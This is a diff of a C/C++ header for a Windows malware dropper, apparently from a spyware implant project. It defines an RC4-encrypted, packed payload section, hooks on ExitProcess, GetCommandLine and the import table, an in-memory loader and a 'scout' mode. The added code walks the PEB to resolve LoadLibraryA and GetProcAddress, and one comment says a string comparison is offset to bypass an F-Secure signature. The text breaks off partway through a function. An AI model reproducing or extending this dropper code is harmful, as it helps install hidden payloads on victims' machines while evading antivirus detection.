@@ -1,141 +1,45 @@
-#ifndef _DROPPERCODE_H
-#define _DROPPERCODE_H
+#include <windows.h>
 
-#include <string>
-using namespace std;
+#ifndef _DROPPER_COMMON
+#define _DROPPER_COMMON
 
-#include "common.h"
-#include "smc.h"
+#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
+#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
-#ifdef WIN32
-#define ALIGN4 __declspec(align(4))
-#else
-#define ALIGN4 __attribute__((packed, aligned(4)))
-#endif
+#define END_OF(x) #x ## "_End"
+#define FUNCTION_END_DECL(x) void x ## _End()
+#define FUNCTION_END(x) FUNCTION_END_DECL(x) { char * y = END_OF(x); return; }
+#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);
 
-#define HOOKSLEEPTIME 5
-
-enum {
-	DATASECTION_ENDMARKER = 0x3E453C00,
-};
-
-enum {
-	OEPSTUBSIZE = 31,
-	ADDRBYTE1 = 6,
-	ADDRBYTE2 = 5,
-	ADDRBYTE3 = 8,
-	ADDRBYTE4 = 10,
-};
-
-extern BYTE oepStub[OEPSTUBSIZE];
-
-// STRINGS indexes
-
-#define STRIDX_EXECUTABLE_NAME	0
-#define STRIDX_INSTALL_DIR		1
-#define STRIDX_TMP_ENVVAR		2
-#define STRIDX_TEMP_ENVVAR		3
-#define STRIDX_KERNEL32_DLL     4
-#define STRIDX_NTDLL_DLL		5
-#define STRIDX_MSVCRT_DLL		6
-#define STRIDX_LOADLIBRARYA		7
-#define STRIDX_GETPROCADDRESS	8
-#define STRIDX_RUNDLL			9
-#define STRIDX_COMMAHFF8		10
-#define STRIDX_HFF5				11
-#define STRIDX_DIRSEP			12
-#define STRIDX_USER32_DLL		13
-#define STRIDX_GETCMDLINEA		14
-#define STRIDX_GETCMDLINEW		15
-#define STRIDX_RTLEXITUSERPROCESS 16
-#define STRIDX_EXITCALL			17
-#define STRIDX__EXITCALL		18
-#define STRING_EXITPROCESS		19
-
-#if _DEBUG
-#define STRIDX_ERRORCREDIR		20
-#define STRIDX_EXITPROCIDX		21
-#define STRIDX_EXITPROCHOOKED   22
-#define STRIDX_RESTOREOEP		23
-#define STRIDX_EXITHOOKED		24
-#define STRIDX_OEPRESTORED		25
-#define STRIDX_CALLINGOEP		26
-#define STRIDX_CREATEFILE_ERR   27
-#define STRIDX_HFF5CALLING      28
-#define STRIDX_HFF5CALLED	    29
-#define STRIDX_INEXITPROC_HOOK  30
-#define STRIDX_VECTORQUIT		31
-#define STRIDX_VERIFYVERSION    32
-#define STRIDX_SYSMAJORVER		33
-#define STRIDX_SYSMINORVER		34
-#define STRIDX_RESTORESTAGE1	35
-#define STRIDX_RESTORESTAGE2	36
-#define STRIDX_UNCOMPRESS_ERR   37
-#endif
-
-// DLL calls indexes
-
-// KERNEL32.dll
-#define	CALL_OUTPUTDEBUGSTRINGA			0
-#define	CALL_CREATEFILEA				1
-#define CALL_CREATEDIRECTORYA			2
-#define CALL_CLOSEHANDLE				3
-#define	CALL_WRITEFILE					4
-#define CALL_READFILE					5
-#define CALL_SETFILEPOINTER				6
-#define CALL_GETMODULEFILENAMEW			7
-#define	CALL_VIRTUALALLOC				8
-#define CALL_VIRTUALFREE				9
-#define CALL_VIRTUALPROTECT				10
-#define CALL_WINEXEC					11
-#define CALL_FREELIBRARY				12
-#define CALL_GETENVIRONMENTVARIABLEA	13
-#define CALL_SETCURRENTDIRECTORYA		14
-#define CALL_SETFILEATTRIBUTESA			15
-#define CALL_DEBUGACTIVEPROCESS			16
-#define CALL_GETCURRENTPROCESSID		17
-#define CALL_CREATETHREAD				18
-#define CALL_GETTHREADCONTEXT			19
-#define CALL_SETTHREADCONTEXT			20
-#define CALL_GETFILESIZE				21
-#define CALL_SLEEP						22
-#define CALL_GETLASTERROR				23
-#define CALL_EXITPROCESS				24
-#define CALL_LOADLIBRARY				25
-#define CALL_GETPROCADDRESS				26
-#define CALL_VIRTUALQUERY				27
-#define CALL_VERIFYVERSIONINFO			28
-#define CALL_GETVERSIONEX				29
-#define CALL_ISWOW64PROCESS				30
-#define CALL_GETCURRENTPROCESS			31
-#define CALL_GETMODULEHANDLE			32
-#define CALL_GETCOMMANDLINEA			33
-#define CALL_GETCOMMANDLINEW			34
-#define CALL_GETMODULEFILENAMEA			35
-#define CALL_GETFILEATTRIBUTESA			36
-
-// NTDLL.DLL
-#define CALL_RTLEXITUSERPROCESS			37
-
-// MSVCRT.dll
-#define CALL_SPRINTF					38
-#define CALL_EXIT						39
-#define CALL__EXIT						40
-
-// ADVAPI32.DLL
-#define CALL_GETCURRENTHWPROFILE		41
-
-// #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
-#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])
-#define STRLEN(idx) _STRLEN_(STRING(idx))
-
-// RC4
-#define SBOX_SIZE 255
-#define MAX_BUF_SIZE 1024
 #define RC4KEYLEN 64
+#define SBOX_SIZE 255
+#define APLIB_PACKED	0x00000001
+#define RC4_CRYPTED		0x00000002
 
-#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0)
-#define RC4_CRYPT(buf, buf_len, key, key_len, header) rc4_skip((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)
+
+
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+
+typedef struct {
+	DWORD InLoadNext;
+	DWORD InLoadPrev;
+	DWORD InMemNext;
+	DWORD InMemPrev;
+	DWORD InInitNext;
+	DWORD InInitPrev;
+	DWORD ImageBase;
+	PVOID EntryPoint;
+	ULONG SizeOfImage;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;
+
 
 typedef struct _data_section_blob {
 	DWORD offset;
@@ -155,11 +59,6 @@ typedef struct _data_section_cryptopack {
 	DWORD characteristics;
 } DataSectionCryptoPack;
 
-// DataSectionCryptoPack Characteristics
-
-#define APLIB_PACKED	0x00000001
-#define RC4_CRYPTED		0x00000002
-
 typedef struct _data_section_files {
 	struct {
 		DataSectionBlob core;
@@ -170,7 +69,7 @@ typedef struct _data_section_files {
 		DataSectionBlob codec;
 		DataSectionBlob	bitmap;
 	} names;
-	
+
 	DataSectionCryptoPack core;
 	DataSectionCryptoPack core64;
 	DataSectionCryptoPack config;
@@ -181,14 +80,9 @@ typedef struct _data_section_files {
 } DataSectionFiles;
 
 typedef void (*WINSTARTFUNC)(void);
-typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
-typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);
 
-
-#define JMP_OPCODE_SIZE 5
-
-typedef ALIGN4 struct _data_section_header {
-
+typedef  __declspec(align(4)) struct _data_section_header 
+{
 	// RC4
 	// Encryption key
 	CHAR rc4key[RC4KEYLEN];
@@ -197,13 +91,13 @@ typedef ALIGN4 struct _data_section_header {
 
 	// OEP
 	WINSTARTFUNC   pfn_OriginalEntryPoint;
-	
+
 	// Synchronization
 	DWORD synchro;
 
 	// used to pass full qualified path to core thread
 	CHAR *dllPath;
-	
+
 	// our own functions
 	struct {
 		DataSectionBlob newEntryPoint;
@@ -217,256 +111,116 @@ typedef ALIGN4 struct _data_section_header {
 		DataSectionBlob hookCall;
 		DataSectionBlob load;
 	} functions;
-	
-	// strings
-	DataSectionBlob stringsOffsets;
-	DataSectionBlob strings;
-	
-	// dlls and addresses
-	DataSectionBlob dlls;
-	DataSectionBlob callAddresses;
-	
-	// appended files
+
 	DataSectionFiles files;
-	
+
 	PatchBlob stage1;
 	PatchBlob stage2;
-	
+
 	DataSectionBlob restore;
 
 	ULONG exeType;
-	LPSTR cmdLineA;
-	LPWSTR cmdLineW;
+	BOOL isScout;
 
-	
+	CHAR instDir[10];
+	CHAR fPrefix[8];
 } DataSectionHeader;
 
-typedef struct _UNICODE_STRING {
-	USHORT Length;
-	USHORT MaximumLength;
-	PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-typedef struct {
-	DWORD InLoadNext;
-	DWORD InLoadPrev;
-	DWORD InMemNext;
-	DWORD InMemPrev;
-	DWORD InInitNext;
-	DWORD InInitPrev;
-	DWORD ImageBase;
-	PVOID EntryPoint;
-	ULONG SizeOfImage;
-	UNICODE_STRING FullDllName;
-	UNICODE_STRING BaseDllName;
-} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;
-
-#pragma region REQUIRED_IMPORTS
-
-typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DataSectionHeader *header);
-typedef DWORD (WINAPI * THREADPROC)(LPVOID lpParameter);
-
-typedef void (WINAPI *OUTPUTDEBUGSTRING)(LPCTSTR lpOutputString);
-typedef HANDLE (WINAPI *CREATEFILE)(LPCTSTR lpFileName,
+typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
+typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);
+typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);
+typedef BOOL (WINAPI *EXTRACTFILE)(PCHAR, DWORD, DWORD, DataSectionHeader*);
+typedef ULONG (WINAPI *MAIN)(HINSTANCE, HINSTANCE, LPSTR, ULONG);
+typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);
+typedef DWORD (WINAPI *GETSHORTPATHNAME)(LPSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
+typedef BOOL (*SHGETFOLDERW)(HWND, LPWSTR, ULONG csidl, BOOL);
+typedef DWORD (WINAPI *GETSHORTPATHNAMEW)(LPWSTR lpszLongPath, LPWSTR lpszShortPath, DWORD cchBuffer);
+typedef HANDLE (WINAPI *CREATEFILEW)(LPWSTR lpFileName,
 									DWORD dwDesiredAccess,
 									DWORD dwShareMode,
 									LPSECURITY_ATTRIBUTES lpSecurityAttributes,
 									DWORD dwCreationDisposition,
 									DWORD dwFlagsAndAttributes,
 									HANDLE hTemplateFile);
-typedef BOOL (WINAPI * CREATEDIRECTORY)(
-							LPCTSTR lpPathName,
-							LPSECURITY_ATTRIBUTES lpSecurityAttributes
-							);
-typedef BOOL (WINAPI * CLOSEHANDLE)(
-								HANDLE hObject
-								);
-typedef BOOL (WINAPI * WRITEFILE)(
-					  HANDLE hFile,
-					  LPCVOID lpBuffer,
-					  DWORD nNumberOfBytesToWrite,
-					  LPDWORD lpNumberOfBytesWritten,
-					  LPOVERLAPPED lpOverlapped
-					  );
-typedef DWORD (WINAPI * SETFILEPOINTER)(
-									HANDLE hFile,
-									LONG lDistanceToMove,
-									PLONG lpDistanceToMoveHigh,
-									DWORD dwMoveMethod
-									);
-typedef BOOL (WINAPI * READFILE)(
-					 HANDLE hFile,
-					 LPVOID lpBuffer,
-					 DWORD nNumberOfBytesToRead,
-					 LPDWORD lpNumberOfBytesRead,
-					 LPOVERLAPPED lpOverlapped
-					 );
-typedef DWORD (WINAPI * GETMODULEFILENAME)(
-									   HMODULE hModule,
-									   LPTSTR lpFilename,
-									   DWORD nSize
-									   );
-typedef DWORD (WINAPI * GETFILEATTRIBUTESA) (LPCSTR lpFileName);
-typedef LPVOID (WINAPI * VIRTUALALLOC)(
-						   LPVOID lpAddress,
-						   SIZE_T dwSize,
-						   DWORD flAllocationType,
-						   DWORD flProtect
-						   );
-typedef BOOL (WINAPI * VIRTUALFREE)(
-								LPVOID lpAddress,
-								SIZE_T dwSize,
-								DWORD dwFreeType
-								);
-typedef BOOL (WINAPI * VIRTUALPROTECT)(
-								   LPVOID lpAddress,
-								   SIZE_T dwSize,
-								   DWORD flNewProtect,
-								   PDWORD lpflOldProtect
-								   );
-typedef UINT (WINAPI * WINEXEC)(
-							LPCSTR lpCmdLine,
-							UINT uCmdShow
-							);
-typedef BOOL (WINAPI * FREELIBRARY)(
-								HMODULE hModule
-								);
-typedef DWORD (WINAPI * GETENVIRONMENTVARIABLE)(
-	LPCTSTR lpName,
-	LPTSTR lpBuffer,
-	DWORD nSize
-	);
-typedef BOOL (WINAPI * SETCURRENTDIRECTORY)(
-	LPCTSTR lpPathName
-	);
-
-typedef BOOL (WINAPI * SETFILEATTRIBUTES)(
-									  LPCTSTR lpFileName,
-									  DWORD dwFileAttributes
-									  );
-typedef BOOL (WINAPI * DEBUGACTIVEPROCESS)(
-									   DWORD dwProcessId
-									   );
-typedef DWORD (WINAPI * GETCURRENTPROCESSID)(void);
-typedef HANDLE (WINAPI * CREATETHREAD)(
-								   LPSECURITY_ATTRIBUTES lpThreadAttributes,
-								   SIZE_T dwStackSize,
-								   LPTHREAD_START_ROUTINE lpStartAddress,
-								   LPVOID lpParameter,
-								   DWORD dwCreationFlags,
-								   LPDWORD lpThreadId
-								   );
-typedef BOOL (WINAPI * GETTHREADCONTEXT)(
-									 HANDLE hThread,
-									 LPCONTEXT lpContext
-									 ); 
-typedef BOOL (WINAPI * SETTHREADCONTEXT)(
-									 HANDLE hThread,
-									 const CONTEXT *lpContext
-									 );
-typedef DWORD (WINAPI * GETFILESIZE)(
-								 HANDLE hFile,
-								 LPDWORD lpFileSizeHigh
-								 );
-typedef void (WINAPI * SLEEP)(DWORD dwMilliseconds);
-
-typedef DWORD (WINAPI * GETLASTERROR)(void); 
-
-typedef VOID (WINAPI  * EXITPROCESS)(UINT uExitCode);
-
-typedef BOOL (WINAPI * TERMINATEPROCESS)(HANDLE hProcess, UINT uExitCode);
-
-typedef int (*SPRINTF)(      
-					 CHAR* lpOut,
-					 CHAR* lpFmt,
-					 ...
-					 );
-
-typedef SIZE_T (WINAPI *VIRTUALQUERY)(
-								   LPCVOID lpAddress,
-								   PMEMORY_BASIC_INFORMATION lpBuffer,
-								   SIZE_T dwLength
-								   );
-
-typedef void (__cdecl *EXIT)(int status);
-
-typedef void (__cdecl *_EXIT)(int status);
-
+typedef HANDLE (WINAPI *CREATEFILEA)(LPSTR lpFileName, 
+									 DWORD dwDesiredAccess, 
+									 DWORD dwShareMode, 
+									 LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
+									 DWORD dwCreationDisposition, 
+									 DWORD dwFlagsAndAttributes, 
+									 HANDLE hTemplateFile);
+typedef BOOL (WINAPI *WRITEFILE)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+typedef BOOL (WINAPI *CLOSEHANDLE)(HANDLE hObject);
+typedef LPVOID (WINAPI *VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL (WINAPI *VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+typedef BOOL (WINAPI *VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpOldProtect);
+typedef DWORD (WINAPI *GETMODULEFILENAME)(HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
+typedef SIZE_T (WINAPI *VIRTUALQUERY)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
+typedef HANDLE (WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef VOID (WINAPI *SLEEP)(DWORD dwMilliseconds);
+typedef VOID (WINAPI  *EXITPROCESS)(UINT uExitCode);
 typedef LPSTR (WINAPI *GETCOMMANDLINEA)();
 typedef LPWSTR (WINAPI *GETCOMMANDLINEW)();
+typedef DWORD (WINAPI *GETENVIRONMENTVARIABLE)(LPCTSTR lpName, LPTSTR lpBuffer, DWORD nSize);
+typedef BOOL (WINAPI *PATHREMOVEFILESPEC)(LPSTR pszPath);
+typedef DWORD (WINAPI *GETFILEATTRIBUTESA) (LPCSTR lpFileName);
+typedef BOOL (WINAPI *CREATEDIRECTORY)(LPCTSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+typedef DWORD (WINAPI *GETLASTERROR)(void);
+typedef BOOL (WINAPI *SETCURRENTDIRECTORY)(LPCSTR lpPathName);
+typedef BOOL (WINAPI *SETFILEATTRIBUTESA)(LPCTSTR lpFileName, DWORD dwFileAttributes);
+typedef LPWSTR (*PATHADDBACKSLASHW)(LPWSTR lpszPath);
+typedef BOOL (*PATHAPPENDW)(LPWSTR pszPath, LPWSTR pszMore);
 
-typedef BOOL (*VERIFYVERSIONINFO) (
-							  OSVERSIONINFOEX* lpVersionInfo,
-							  DWORD dwTypeMask,
-							  DWORDLONG dwlConditionMask
-							  );
 
-typedef BOOL (*GETVERSIONEX)( OSVERSIONINFO* lpVersionInfo );
+typedef struct _MY_DATA
+{
+	LOADLIBRARY LoadLibraryA;
+	GETPROCADDRESS GetProcAddress;
+	GETMODULEHANDLE GetModuleHandleA;
+	VIRTUALALLOC VirtualAlloc;
+	VIRTUALFREE VirtualFree;
+	GETMODULEFILENAME GetModuleFileNameA;
+	VIRTUALPROTECT VirtualProtect;
+	VIRTUALQUERY VirtualQuery;
+	CREATETHREAD CreateThread;
+	GETENVIRONMENTVARIABLE GetEnvironmentVariableA;
+	PATHREMOVEFILESPEC PathRemoveFileSpecA;
+	GETFILEATTRIBUTESA GetFileAttributesA;
+	SETFILEATTRIBUTESA SetFileAttributesA;
+	CREATEDIRECTORY CreateDirectoryA;
+	GETLASTERROR GetLastError;
+	SETCURRENTDIRECTORY SetCurrentDirectoryA;
+	CREATEFILEA CreateFileA;
+	CREATEFILEW CreateFileW;
+	WRITEFILE WriteFile;
+	CLOSEHANDLE CloseHandle;
+	SHGETFOLDERW SHGetSpecialFolderPathW;
+	GETSHORTPATHNAMEW GetShortPathNameW;
+	PATHADDBACKSLASHW PathAddBackslashW;
+	PATHAPPENDW PathAppendW;
 
-typedef BOOL (*GETCURRENTHWPROFILE)(
-									LPHW_PROFILE_INFO lpHwProfileInfo
-									);
+	DataSectionHeader *header;
+	PBYTE pScoutBuffer;
+	ULONG pScoutSize;
+} MY_DATA, *PMY_DATA;
 
-typedef BOOL (*ISWOW64PROCESS)(HANDLE, BOOL *);
+int __stdcall DropperEntryPoint();
+FUNCTION_END_DECL(DropperEntryPoint);
 
-typedef HANDLE (*GETCURRENTPROCESS)(void);
-
-typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);	
-
-typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);
-
-typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
-						 unsigned char *data, size_t data_len, DataSectionHeader *header);
-
-typedef DWORD (*HOOKCALL)(char* dll,
-	char* name,
-	DWORD hookFunc,
-	UINT_PTR IAT_RVA,
-	DWORD imageBase,
-	DataSectionHeader *header);
-
-#pragma endregion
-
-#pragma region CUSTOM_INLINE_FUNCTIONS
-
-// Important: Compiler must set /O2 (Maximize Speed) to ensure inline functions
-// Although compiler provides #pragma intrinsic it is not 100% reliable
-
-__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz );
-__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz );
-__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz );
-__forceinline size_t _STRLEN_(char *_src);
-__forceinline size_t _STRLENW_(wchar_t *_src);
-__forceinline void _TOUPPER_(char *s);
-__forceinline  void _TOUPPER_CHAR(char *c);
-__forceinline void _TOLOWER_(char *s);
-__forceinline int _STRCMP_(char *_src1, char *_src2);
-__forceinline int _STRCMPI_(char *_src1, char *_src2);
-__forceinline char* _STRRCHR_(char const *s, int c);
-__forceinline void _STRCAT_(char*_src1, char *_src2);
-__forceinline void _ZEROMEM_(char* mem, int size);
-__forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length );
-__forceinline LOADLIBRARY resolveLoadLibrary();
-__forceinline GETPROCADDRESS resolveGetProcAddress();
-#pragma endregion
-
-// TODO change all _End function using macros
-
-// *** Entry Point 
-int __stdcall NewEntryPoint();
-FUNCTION_END_DECL(NewEntryPoint);
-// int __stdcall NewEntryPoint_End();
-
-BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, DataSectionHeader* header);
-FUNCTION_END_DECL(DumpFile);
-// void __stdcall DumpFile_End(CHAR * fileName, CHAR* fileData, DWORD fileSize);
-
-DWORD WINAPI CoreThreadProc(LPVOID lpParameter);
+DWORD WINAPI CoreThreadProc(PMY_DATA pData);
 FUNCTION_END_DECL(CoreThreadProc);
-// DWORD WINAPI CoreThreadProc_End(__in  LPVOID lpParameter);
 
-VOID WINAPI ExitProcessHook(UINT uExitCode);
-FUNCTION_END_DECL(ExitProcessHook);
+BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, PMY_DATA pData);
+FUNCTION_END_DECL(DumpFile);
+
+DWORD HookIAT(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData);
+FUNCTION_END_DECL(HookIAT);
+
+void ArcFour(const unsigned char *key, size_t keylen, size_t skip, unsigned char *data, size_t data_len, PMY_DATA pData);
+FUNCTION_END_DECL(ArcFour);
+
+LPVOID WINAPI MemoryLoader(LPVOID pData);
+FUNCTION_END_DECL(MemoryLoader);
 
 LPSTR WINAPI GetCommandLineAHook();
 FUNCTION_END_DECL(GetCommandLineAHook);
@@ -474,15 +228,341 @@ FUNCTION_END_DECL(GetCommandLineAHook);
 LPWSTR WINAPI GetCommandLineWHook();
 FUNCTION_END_DECL(GetCommandLineWHook);
 
-void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
-			  unsigned char *data, size_t data_len, DataSectionHeader *header);
-FUNCTION_END_DECL(rc4_skip);
+VOID WINAPI ExitProcessHook(UINT uExitCode);
+FUNCTION_END_DECL(ExitProcessHook);
 
-DWORD hookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header);
-FUNCTION_END_DECL(hookCall);
+typedef DWORD (WINAPI * THREADPROC)(LPVOID lpParameter);
+typedef BOOL (WINAPI * DUMPFILE)(PCHAR fileName, PCHAR fileData, DWORD fileSize, DWORD originalSize, PMY_DATA pData);
+typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip, unsigned char *data, size_t data_len, PMY_DATA pData);
+typedef void (*HFF5)(PCHAR, DWORD, LPSTARTUPINFO, LPPROCESS_INFORMATION);
+typedef DWORD (*HOOKIAT)(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, PMY_DATA pData);
+
+// CRT DEI POVERI
+__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
+{
+	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
+}
+
+__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
+{
+	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
+}
+
+__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
+{
+	while ( _sz-- )
+	{
+		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
+			return FALSE;
+	}
+
+	return TRUE;
+}
+
+__forceinline size_t _STRLEN_(char *_src)
+{
+	size_t count = 0;
+	while( _src && *_src++ )
+		count++;
+	return count;
+}
+
+__forceinline size_t _STRLENW_(wchar_t *_src)
+{	
+	ULONG count = 0;
+	while(_src && (*(PUSHORT)_src++ != 0x0000))
+		count += 2;
+	return count;
+}
+
+__forceinline void _TOUPPER_(char *s)
+{
+	for(; *s; s++)
+		if(('a' <= *s) && (*s <= 'z'))
+			*s = 'A' + (*s - 'a');
+}
+
+__forceinline  void _TOUPPER_CHAR(char *c)
+{
+	if((*c >= 'a') && (*c <= 'z'))
+		*c = 'A' + (*c - 'a');
+}
+
+__forceinline void _TOLOWER_(char *s)
+{
+	for(; *s; s++)
+		if(('A' <= *s) && (*s <= 'Z'))
+			*s = 'a' + (*s - 'A');
+}
+
+__forceinline int _STRCMP_(char *_src1, char *_src2)
+{
+	size_t sz = _STRLEN_(_src1);
+
+	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
+		return 1;
+
+	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
+}
+
+__forceinline int _STRCMPI_(char *_src1, char *_src2)
+{
+	char* s1 = _src1;
+	char* s2 = _src2;
+
+	while (*s1 && *s2)
+	{
+		char a = *s1;
+		char b = *s2;
+
+		_TOUPPER_CHAR(&a);
+		_TOUPPER_CHAR(&b);
+
+		if (a != b)
+			return 1;
+
+		s1++;
+		s2++;
+	}
+
+	return 0;
+}
+
+__forceinline char* _STRRCHR_(char const *s, int c)
+{
+	char* rtnval = 0;
+
+	do {
+		if (*s == c)
+			rtnval = (char*) s;
+	} while (*s++);
+	return (rtnval);
+}
+
+__forceinline void _STRCAT_(char*_src1, char *_src2)
+{
+	char* ptr = _src1 + _STRLEN_(_src1);
+	_MEMCPY_(ptr, _src2, _STRLEN_(_src2));
+	ptr += _STRLEN_(_src2);
+	*ptr = '\0';
+}
+
+__forceinline void _ZEROMEM_(char* mem, int size)
+{
+	for (int i = 0; i < size; i++)
+		mem[i] = 0;
+}
 
 
-void generate_key(std::string& key, unsigned int length);
-bool dumpDropperFiles();
+__forceinline GETPROCADDRESS resolveGetProcAddress()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
 
-#endif /* _DROPPER_H */
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strGetProcAddress, name))
+							return (GETPROCADDRESS)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
+}
+
+__forceinline LOADLIBRARY resolveLoadLibrary()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
+
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
